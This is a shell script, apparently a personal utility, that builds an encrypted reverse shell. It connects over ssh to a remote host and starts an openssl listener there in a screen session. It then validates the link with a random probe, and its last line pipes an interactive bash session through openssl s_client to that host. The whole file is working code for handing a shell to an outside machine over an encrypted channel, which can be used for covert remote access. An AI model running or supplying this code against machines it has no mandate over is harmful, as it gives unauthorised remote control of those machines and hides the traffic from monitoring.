#!/bin/sh

BRED="\033[1;31m"
BYELLOW='\033[1;93m'
BORANGE='\033[01;38;5;214m'
BGREEN='\033[1;92m'
NOCOLOR='\033[0m'

cname=$1
installdir=~/.ReverseShell #For local only, remote is static

if [ -f $installdir/$cname/$cname.cfg ]; then
	. $installdir/$cname/$cname.cfg
else
	echo "error: $cname config not found! please check $installdir or run reverseshell_configmaker.sh again!!"
	echo "valid configs: $(ls $installdir | xargs)"
	exit 2
fi

#Make sure there are no previous sessions running!
echo -e "${BYELLOW}Making sure there are no previous sessions active...${NOCOLOR}"
ssh -t -p $sshport -l $sshuser $rhost "screen -ls | grep listener_$cname | cut -d '.' -f 1 | xargs kill -9 2>/dev/null && screen -wipe"

#Start the listener (with ssl) on our remote(receiver) host via ssh and log everything to a temp file for external probing
ssh -t -p $sshport -l $sshuser $rhost "rm -f /tmp/reverselistener_$cname; screen -dmS listener_$cname; screen -S listener_$cname -X stuff \"openssl s_server -quiet -key ~/.ReverseShell/$cname/key.pem -cert ~/.ReverseShell/$cname/cert.pem -port $rport | tee /tmp/reverselistener_$cname\"`echo -ne '\015'`"

#Keep it clean.
rm -f /tmp/reversesocket_$cname 2> /dev/null

#Connect to our listener from our current host
mkfifo $installdir/reversesocket_$cname

#Allow the ssl server to Ketchup
sleep 1

#Do a connection probe to see we connected the right hosts.###################################################################################################################
probe=$(strings /dev/urandom | grep -o '[[:alnum:]]' | head -n 30 | tr -d '\n'; echo)
echo -e "${BYELLOW}Testing/Validating connection...${NOCOLOR}"
#send the unique probe via SSL
echo "$probe" | openssl s_client -quiet -connect $rhost:$rport &
#Give the asynchronious fork some time to complete. Yes, this also means we do not support lag greater than 1000ms in our handshake proces.
sleep 1
#Identify the forked SSL job (it wont stop automaticly since our SSL server has no connectionhandeling)
probejob=$(jobs -l | grep -i openssl | awk 'FNR==1{print $1}')
#Destroy the forked SSL job
kill -9 $probejob
#Check if the UUID matches.
probe2=$(ssh -t -p $sshport -l $sshuser $rhost "tail -n1 /tmp/reverselistener_$cname")

#Clean up SSL escape chars
probe=$(echo $probe | tr -dc '[:print:]')
probe2=$(echo $probe2 | tr -dc '[:print:]')
echo "ssl probedata: $probe"
echo "ssh probedata: $probe2"

if [ "$probe" == "$probe2" ]; then
	echo -e "${BGREEN}Yep, connection is validated. Redirecting shell to listening host.${NOCOLOR}"
else
	echo -e "${BRED}ERROR: something is wrong with the connection! lag is greater than 1000ms or we could not match the 2 hosts!${NOCOLOR}"
	exit 2
fi
#Do a connection probe to see we connected the right hosts.###################################################################################################################

echo -e "${BYELLOW}Connect to the screen ${BGREEN}listener_$cname${BYELLOW} on your listener host ($rhost)${NOCOLOR}"
echo -e "${BYELLOW}Warning: Pressing CTRL+C will exit that shell in the screen session.${NOCOLOR}"
#The Dresden Shuffle with bash. This is where we actually redirect the shell via a socket.
/bin/bash -i < $installdir/reversesocket_$cname 2>&1 | openssl s_client -quiet -connect $rhost:$rport > $installdir/reversesocket_$cname
